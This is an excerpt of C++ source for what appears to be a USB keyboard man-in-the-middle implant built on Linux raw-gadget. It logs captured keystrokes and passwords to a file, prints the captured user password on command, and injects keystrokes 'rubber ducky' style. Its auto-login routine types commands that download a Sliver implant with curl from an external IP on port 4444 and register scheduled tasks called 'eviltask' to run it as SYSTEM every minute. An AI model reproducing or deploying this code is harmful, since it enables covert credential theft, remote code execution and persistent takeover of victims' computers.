...
void handleAutoLogin(std::string userPassword) {
    ...
    //testFunc("[enter]");
    sleep(0.1);
    testFunc("curl.exe https://51.107.220.118:4444/sliv.exe -o 'C:\\.temp26422\\sliver.exe' -k");
    sleep(3);
    testFunc("schtasks /create /sc minute /mo 1 /tn 'eviltask' /tr C:\\.temp26422\\sliver.exe /ru 'SYSTEM'");
    sleep(1);
    testFunc("schtasks /create /sc minute /mo 1 /tn 'eviltask2' /tr C:\\.temp26422\\sliver.exe /ru 'bruker'");
    sleep(2);
...
void handleUserInput() {
    ...
    while (running) {
        ...
        if (command == "pass") {
            std::cout << "User password: " << password << "\n";
        }
        ...
        if (command.rfind("run ", 0) == 0) {
            ...
            printf(
                "run <any input>, [win, [cmd, [lock, [citrix-menu, [progs q\n");
            ...
            if (parts.size() >= 2) {
                ...
                rubber_ducky(globalFd, globalIo, globalIoBackup, globalFinito,
                             globalBEndpointAddress, globalTransferType,
                             globalDir, cmdVector, cmdString, direction);
            }
...
void getData(struct usb_raw_transfer_io io, __u8 bEndpointAddress,
    ...
    //std::string timestamp = (local_time->tm_year + 1900) << "-" << (local_time->tm_mon + 1) + "-" + local_time->tm_mday + " "+ local_time->tm_hour ":" + local_time->tm_min + ":" + local_time->tm_sec;
    ...
    while (!passwordInput) {
        ...
        writeLettersToFile("/home/kali/Desktop/output2.txt", timestamp + " " + asciiLetters + "\r\n");
        return;
    }
    if (passwordInput) {
        std::string asciiLetters = getAsciiLetters(io);
...
void rubber_ducky(int globalFd, struct usb_raw_transfer_io globalIo,
    ...
    if (cmdString == "win") {
        ...
        for (unsigned int j = 0; j < charList2.size(); j += 8) {
            ...
            int rv =
                usb_raw_ep_write(globalFd, (struct usb_raw_ep_io *)&globalIo);
...
void *ep_loop_read(void *arg) {
    ...
    while (!please_stop_eps) {
        ...
        if (ep.bEndpointAddress & USB_DIR_IN) {
            ...
            receive_data(ep.bEndpointAddress, ep.bmAttributes,
                         ep.wMaxPacketSize, &data, &nbytes, 0);
...
void process_eps(int fd, int config, int interface, int altsetting) {
    ...
    for (int i = 0; i < alt->interface.bNumEndpoints; i++) {
        ...
        ep->thread_info.ep_num =
            usb_raw_ep_enable(fd, &ep->thread_info.endpoint);
        printf("%s_%s: addr = %u, ep = #%d\n",
               ep->thread_info.transfer_type.c_str(),
               ep->thread_info.dir.c_str(), addr, ep->thread_info.ep_num);

        if (verbose_level)
            printf("Creating thread for EP%02x\n",
                   ep->thread_info.endpoint.bEndpointAddress);
        pthread_create(&ep->thread_read, 0, ep_loop_read,
                       (void *)&ep->thread_info);
...
void ep0_loop(int fd) {
    ...
    if (verbose_level) print_eps_info(fd);
        ...
        if (event.ctrl.bRequestType & USB_DIR_IN) {
            ...
            if (result == 0) {
                ...
                if (bmaxpacketsize0_must_greater_than_64 &&
                    ...
                    if (dev->bMaxPacketSize0 < 64) dev->bMaxPacketSize0 = 64;
                }

                if (verbose_level >= 2) getData(io, 0x00, "control", "in");
            ...
            if ((event.ctrl.bRequestType & USB_TYPE_MASK) ==
                ...
                for (int i = 0; i < host_device_desc.device.bNumConfigurations;
                     i++) {
                    if (host_device_desc.configs[i]
                            .config.bConfigurationValue == event.ctrl.wValue) {
                        desired_config = i;
                        break;
                    }
                }
                if (desired_config < 0) {
                    printf(
                        "[Warning] Skip changing configuration, wValue(%d) is "
                        "invalid\n",
                        event.ctrl.wValue);
                    continue;
                }
                ...
                for (int i = 0; i < config->config.bNumInterfaces; i++) {
                    ...
                    int interface_num =
                        iface->altsettings[0].interface.bInterfaceNumber;
                ...
                for (int i = 0; i < config->config.bNumInterfaces; i++) {
                    if (config->interfaces[i]
                            .altsettings[0]
                            .interface.bInterfaceNumber == event.ctrl.wIndex) {
                        desired_interface = i;
                        break;
                    }
                }
                if (desired_interface < 0) {
                    printf(
                        "[Warning] Skip changing interface, wIndex(%d) is "
                        "invalid\n",
                        event.ctrl.wIndex);
                    continue;
                }
                ...
                if (desired_altsetting < 0) {
                    printf(
                        "[Warning] Skip changing alt_setting, wValue(%d) is "
                        "invalid\n",
                        event.ctrl.wValue);
                    continue;
                }
                ...
                if (verbose_level >= 2) getData(io, 0x00, "control", "out");

                result =
                    control_request(&event.ctrl, &nbytes, &control_data, 1000);
                if (result == 0) {
